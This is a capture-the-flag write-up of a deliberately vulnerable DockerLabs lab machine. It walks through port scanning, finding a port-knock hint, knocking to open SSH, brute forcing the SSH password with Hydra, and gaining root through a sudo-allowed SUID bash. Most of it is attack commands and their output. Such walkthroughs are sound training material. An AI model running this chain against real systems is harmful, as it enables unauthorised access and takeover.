# los40ladrones

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| los40ladrones | firstatack | easy/facil | dockerlabs |

**Summary:** The los40ladrones machine was a port knocking challenge that combined a hidden hint file, a three-port knock sequence to unlock SSH, Hydra bruteforcing of the newly opened service, and a direct root escalation via a SUID bash binary permitted through sudo. The initial Nmap scan revealed only port 80 with 65534 ports filtered — a strong indicator of a port-knocking firewall. Gobuster against the virtual host `bypass403.pw` surfaced a file `qdefense.txt`. Fetching it with curl returned a plaintext hint instructing the reader to "knock before entering" and listing the sequence `7000 8000 9000`. The `knock` tool was used to send the three-port sequence to `bypass403.pw`. A rescan immediately after confirmed port 22 now open alongside port 80. The hint file also mentioned the name `toctoc` — matching the "toctoc el maleducado" reference — which was used as the SSH username. Hydra bruteforced the credential against `rockyou.txt` and cracked the password `kittycat`. SSH access was established as `toctoc`. A `sudo -l` check revealed two sudoers entries: one for `/opt/bash` and one for `/ahora/noesta/function`, the latter of which did not exist on the filesystem. The existing binary `/opt/bash` carried the SUID bit. Running `sudo -u root /opt/bash` dropped immediately into a root shell.

---

## Reconnaissance

**1. Machine Deployment**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/los40ladrones]
└─$ sudo bash auto_deploy.sh los40ladrones.tar 

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /"""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

**2. Initial Port Scan**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/los40ladrones]
└─$ nmap -sC -sV -p- -T4 $ip             
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 17:13 +0700
Nmap scan report for bypass403.pw (172.17.0.2)
Host is up (0.0053s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 1E:4D:3B:68:7E:82 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.75 seconds
```

Only port 80 was open. The 65534 filtered ports with no response was a clear indicator of a port-knocking firewall protecting the remaining services.

---

## Initial Access

### Port Knocking via qdefense.txt

**3. Gobuster Discovery and Fetching the Knock Hint**

Gobuster was run against the virtual host `bypass403.pw` and found a file `qdefense.txt` alongside the default Apache index.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/los40ladrones]
└─$ gobuster dir -u http://bypass403.pw/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,html,zip,tar,env,bak,js,css,png          
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bypass403.pw/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              png,php,html,tar,env,bak,js,css,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 10792]
qdefense.txt         (Status: 200) [Size: 111]
server-status        (Status: 403) [Size: 277]
Progress: 2426127 / 2426127 (100.00%)
===============================================================
Finished
===============================================================
```

The file `qdefense.txt` was fetched with curl.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/los40ladrones]
└─$ curl -v http://bypass403.pw/qdefense.txt                       
* Host bypass403.pw:80 was resolved.
* IPv6: (none)
* IPv4: 172.17.0.2, 172.17.0.2
*   Trying 172.17.0.2:80...
* Established connection to bypass403.pw (172.17.0.2 port 80) from 172.17.0.1 port 40430 
* using HTTP/1.x
> GET /qdefense.txt HTTP/1.1
> Host: bypass403.pw
> User-Agent: curl/8.20.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Mon, 03 Aug 2026 10:24:17 GMT
< Server: Apache/2.4.58 (Ubuntu)
< Last-Modified: Tue, 02 Jul 2024 20:16:39 GMT
< ETag: "6f-61c49642b17c0"
< Accept-Ranges: bytes
< Vary: Accept-Encoding
< Content-Length: 111
< Content-Type: text/plain
< 
Recuerda llama antes de entrar , no seas como toctoc el maleducado
7000 8000 9000
busca y llama +54 2933574639
* Connection #0 to host bypass403.pw:80 left intact
```

The file contained the knock sequence `7000 8000 9000` and a reference to the name `toctoc` — both key pieces of information.

**4. Sending the Port Knock and Confirming SSH is Open**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/los40ladrones]
└─$ knock bypass403.pw 7000 8000 9000
```

A rescan immediately after the knock confirmed port 22 was now open.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/los40ladrones]
└─$ nmap -p- -T4 bypass403.pw
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 17:26 +0700
Nmap scan report for bypass403.pw (172.17.0.2)
Host is up (0.00013s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 1E:4D:3B:68:7E:82 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 216.51 seconds
                                                                                         
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/los40ladrones]
└─$ nmap -p 22,80 -sC -sV -T4 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 17:31 +0700
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 17:31 (0:00:06 remaining)
Nmap scan report for bypass403.pw (172.17.0.2)
Host is up (0.000082s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 dc:ef:4e:ec:c9:3e:3d:68:dd:f5:1f:23:21:a3:98:83 (ECDSA)
|_  256 3e:c1:74:c1:44:af:6f:d0:90:15:4c:95:46:0a:ea:22 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 1E:4D:3B:68:7E:82 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.36 seconds
```

Port 22 running OpenSSH 9.6p1 was now reachable.

### SSH Bruteforce and Access as toctoc

**5. Bruteforcing SSH with Hydra**

The username `toctoc` was extracted from the hint file. Hydra was used against `rockyou.txt` to crack the SSH password.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/los40ladrones]
└─$ hydra -l toctoc -P /usr/share/wordlists/rockyou.txt ssh://$ip -t 8 -I
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-03 17:43:55
[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 129.00 tries/min, 129 tries in 00:01h, 14344270 to do in 1853:16h, 8 active
[STATUS] 137.00 tries/min, 411 tries in 00:03h, 14343988 to do in 1745:01h, 8 active
[22][ssh] host: 172.17.0.2   login: toctoc   password: kittycat
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-03 17:50:08
```

The password `kittycat` was cracked for user `toctoc`.

**6. Logging in via SSH**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/los40ladrones]
└─$ ssh toctoc@$ip                     
toctoc@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.18.33.2-microsoft-standard-WSL2 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
toctoc@8aa59d1e6e33:~$ id;whoami
uid=1001(toctoc) gid=1001(toctoc) groups=1001(toctoc),100(users)
toctoc
toctoc@8aa59d1e6e33:~$ ls -la
total 32
drwxr-x--- 1 toctoc toctoc 4096 Aug  3 20:50 .
drwxr-xr-x 1 root   root   4096 Jul  3  2024 ..
-rw-r--r-- 1 toctoc toctoc  220 Jul  3  2024 .bash_logout
-rw-r--r-- 1 toctoc toctoc 3890 Jul  3  2024 .bashrc
drwx------ 2 toctoc toctoc 4096 Aug  3 20:50 .cache
drwxrwxr-x 3 toctoc toctoc 4096 Jul  3  2024 .local
-rw-r--r-- 1 toctoc toctoc  807 Jul  3  2024 .profile
```

---

## Privilege Escalation

### sudo /opt/bash Direct Root Shell

**7. Checking sudo Permissions and Inspecting /opt/bash**

```bash
toctoc@8aa59d1e6e33:~$ sudo -l
[sudo] password for toctoc: 
Matching Defaults entries for toctoc on 8aa59d1e6e33:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
User toctoc may run the following commands on 8aa59d1e6e33:
    (ALL : NOPASSWD) /opt/bash
    (ALL : NOPASSWD) /ahora/noesta/function
```

Two sudoers entries were present. The path `/ahora/noesta/function` did not exist on the filesystem. The binary `/opt/bash` was confirmed as present and carried the SUID bit.

```bash
toctoc@8aa59d1e6e33:~$ ls -la /opt/bash 
-rwsr-S--- 1 root root 1446024 Aug  3 20:30 /opt/bash
toctoc@8aa59d1e6e33:~$ ls -la /ahora/noesta/function
ls: cannot access '/ahora/noesta/function': No such file or directory
toctoc@8aa59d1e6e33:~$ ls -la /ahora/noesta/function
ls: cannot access '/ahora/noesta/function': No such file or directory
```

`/opt/bash` was a 1.4 MB binary with the SUID bit set, owned by root. Running it via `sudo -u root` would launch it with root privileges.

**8. Escalating to Root**

```bash
toctoc@8aa59d1e6e33:~$ sudo -u root /opt/bash
root@8aa59d1e6e33:/home/toctoc# cd
root@8aa59d1e6e33:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
8aa59d1e6e33
```

Running `sudo -u root /opt/bash` dropped directly into a root shell. Full root access was achieved.

---

## Attack Chain Summary
1. **Reconnaissance**: The initial Nmap scan revealed only port 80 with 65534 filtered ports — a clear indicator of a port-knocking firewall. The Apache default page was served. Gobuster against the virtual host `bypass403.pw` found `qdefense.txt`.
2. **Port Knock Discovery**: Fetching `qdefense.txt` with curl returned a plaintext file containing the three-port knock sequence `7000 8000 9000` and a reference to the name `toctoc` as the user who "knocks rudely without calling first".
3. **Unlocking SSH**: The `knock` tool sent the sequence `7000 8000 9000` to `bypass403.pw`. A subsequent Nmap rescan confirmed port 22 now open, running OpenSSH 9.6p1. A targeted service scan confirmed the SSH version details.
4. **SSH Access**: Using the username `toctoc` extracted from the hint file, Hydra bruteforced the SSH service against `rockyou.txt` and cracked the password `kittycat`. SSH access was established as `toctoc`.
5. **Privilege Escalation**: A `sudo -l` check revealed two entries: `/opt/bash` and `/ahora/noesta/function`. The second path did not exist. The first, `/opt/bash`, was a 1.4 MB SUID binary owned by root. Running `sudo -u root /opt/bash` dropped directly into a root shell.
